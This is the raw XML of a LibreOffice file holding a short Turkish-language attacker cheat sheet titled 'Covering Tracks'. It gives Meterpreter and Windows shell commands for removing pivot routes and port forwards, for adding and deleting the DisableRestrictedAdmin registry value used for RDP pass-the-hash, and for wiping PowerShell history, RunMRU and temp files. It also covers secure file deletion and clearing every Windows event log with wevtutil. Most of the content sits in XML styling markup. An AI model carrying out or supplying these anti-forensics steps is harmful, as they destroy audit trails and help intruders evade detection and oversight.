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text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001c490a" officeooo:paragraph-rsid="001c490a" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001c490a" officeooo:paragraph-rsid="001f4b11" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001d27fe" officeooo:paragraph-rsid="001d27fe" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003e2ff3" officeooo:paragraph-rsid="00315f80" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#127622" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="00413c29" officeooo:paragraph-rsid="00413c29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fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003e2ff3" officeooo:paragraph-rsid="00315f80" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00413c29" officeooo:paragraph-rsid="00413c29" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00427dcb" officeooo:paragraph-rsid="00427dcb" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001d27fe" officeooo:paragraph-rsid="001d27fe" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0043b6ef" officeooo:paragraph-rsid="0043b6ef" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001c490a" officeooo:paragraph-rsid="0043b6ef" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001c490a" officeooo:paragraph-rsid="001c490a" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00413c29" officeooo:paragraph-rsid="00413c29" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00413c29" officeooo:paragraph-rsid="00422c67" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00413c29" officeooo:paragraph-rsid="00427dcb" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0043b6ef" officeooo:paragraph-rsid="0043b6ef" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="00422c67"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00427d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5.COVERING TRACKS</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P13">Route ve Port Yönlendirmelerinin Silinmesi</text:p>
      <text:p text:style-name="P4">run autoroute -d -s 192.168.10.0/24 </text:p>
      <text:p text:style-name="P4">portfwd delete -l 1234 -r 10.10.10.20 -p 3389</text:p>
      <text:p text:style-name="P7">portfwd delete -i 1 <text:s/>(index)</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P14">R<text:span text:style-name="T1">egistry Girdilerinin Silinmesi</text:span></text:p>
      <text:p text:style-name="P4">Eklenmiş Registry Girdisi:</text:p>
      <text:p text:style-name="P4">reg add HKLM\System\CurrentControlSet\Control\Lsa -t REG_DWORD -v DisableRestrictedAdmin -d 0x0 -f</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Windows Shell'de Silme:</text:p>
      <text:p text:style-name="P4">reg delete HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Meterpreter Shell'de Görüntüleme ve Silme:</text:p>
      <text:p text:style-name="P4">reg enumkey -k "HKLM\\System\\CurrentControlSet\\Control\\Lsa"</text:p>
      <text:p text:style-name="P4">reg deletekey -k "HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin"</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P14"><text:span text:style-name="T1">Powershell Geçmişinin Silinmesi</text:span></text:p>
      <text:p text:style-name="P4">C:\Users\a.bilgi\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine</text:p>
      <text:p text:style-name="P8">burada yazılan her komut saklanır.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P8">Powershell e yazılınca siler.</text:p>
      <text:p text:style-name="P4">remove-item -force -path $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P15"><text:span text:style-name="T2">Run </text:span><text:span text:style-name="T1">Geçmişinin Silinmesi</text:span></text:p>
      <text:p text:style-name="P4">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</text:p>
      <text:p text:style-name="P8">bu yolun içinde çalıştırılmış başarılı komutlar gözükür.</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P15"><text:span text:style-name="T2">Temp G</text:span><text:span text:style-name="T1">eçmişinin Silinmesi</text:span></text:p>
      <text:p text:style-name="P8">Sessizce ve zorlayarak sil.</text:p>
      <text:p text:style-name="P8">Shell içinde..</text:p>
      <text:p text:style-name="P8">del /q /f /s %TEMP%\*</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P15"><text:span text:style-name="T2">Geri Dönülemez Olarak S</text:span><text:span text:style-name="T1">il</text:span><text:span text:style-name="T2">me</text:span></text:p>
      <text:p text:style-name="P3">windows/manage/sdel</text:p>
      <text:p text:style-name="P3">set file "c:\users\a.bilgi\Desktop\1.txt"</text:p>
      <text:p text:style-name="P10">session ve iteration u belirleyip run edince, iteration sayısı kadar siler.</text:p>
      <text:p text:style-name="P10">Karşı shellde /w:c <text:s/>yapılabilir.</text:p>
      <text:p text:style-name="P10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6">Kayıtların (Logların) Yok Edilmesi</text:p>
      <text:p text:style-name="P10">meterpreterda</text:p>
      <text:p text:style-name="P10">run event_manager -h <text:s/>-i <text:s/>-c all</text:p>
      <text:p text:style-name="P10">shellde</text:p>
      <text:p text:style-name="P11">for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"</text:p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13T16:29:24.244476136</dc:date>
    <meta:editing-duration>PT8H30M30S</meta:editing-duration>
    <meta:editing-cycles>43</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.1.1$Linux_X86_64 LibreOffice_project/40$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="35" meta:word-count="148" meta:character-count="1469" meta:non-whitespace-character-count="1351"/>
  </office:meta>
</office:document-meta>
</file>